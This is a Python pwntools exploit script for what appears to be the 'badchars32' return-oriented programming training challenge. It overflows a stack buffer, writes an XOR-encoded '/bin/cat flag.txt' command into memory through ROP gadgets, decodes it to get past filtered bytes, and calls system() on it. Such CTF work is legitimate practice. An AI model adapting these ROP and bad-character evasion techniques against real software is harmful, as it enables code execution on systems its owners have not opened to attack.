import sys
import struct
import pwn


class arbitraryWrite:
    def __init__(self, popper, mover):
        self.popper = popper
        self.mover = mover

    def get_chain(self, to_addr: int, value: int):
        payload = pwn.p32(self.popper)
        payload += pwn.p32(to_addr)
        payload += pwn.p32(value)
        payload += pwn.p32(self.mover)
        return payload

    def write_string(self, start_addr: int, string: str):
        n = 4
        length = len(string)
        payload = b''
        for word in range(0, length, n):
            hexed = string[word:min(word + n, length)]
            to_addr = start_addr + word
            value = int("0x" + "".join([hex(ord(character))[2:] for character in hexed[::-1]]), 0)
            payload += self.get_chain(to_addr, value)
        return payload


x = lambda a: struct.pack('<I', a)
e = pwn.ELF("badchars32")
written_addr = e.bss()
# 0x8048896:  pop ebx; pop ecx; ret;
# 0x8048890:  xor byte ptr [ebx], cl; ret;
# payload += x(0x80488f9)  # pop esi; pop edi; pop ebp; ret;
system = 0x80484e0
bin_sh = 0xf7f1baaa
pop_edi_ret = 0x804889a
payload = ('D'*40).encode()
payload += ('B'*4).encode()

aw = arbitraryWrite(0x08048899, 0x08048893)
command = "/bin/cat flag.txt\x00"
payload += aw.write_string(written_addr, pwn.xor(command, 0xfd).decode("ISO-8859-1"))
# ok this class needs to be renamed
ax = arbitraryWrite(0x8048896, 0x8048890)

for i in range(0, len(command), 4):
    payload += ax.get_chain(written_addr + i, 0xffffff00 + 0xfd)

payload += x(system)
payload += 'JJJJ'.encode()
payload += x(written_addr)
payload += 'JJJJ'.encode()
# payload += x(bin_sh)
# payload += '\n'.encode()
sys.stdout.buffer.write(payload)

p = pwn.tubes.process.process(["./badchars32"], shell=True)
p.send_raw(payload)
p.interactive()
p.close()


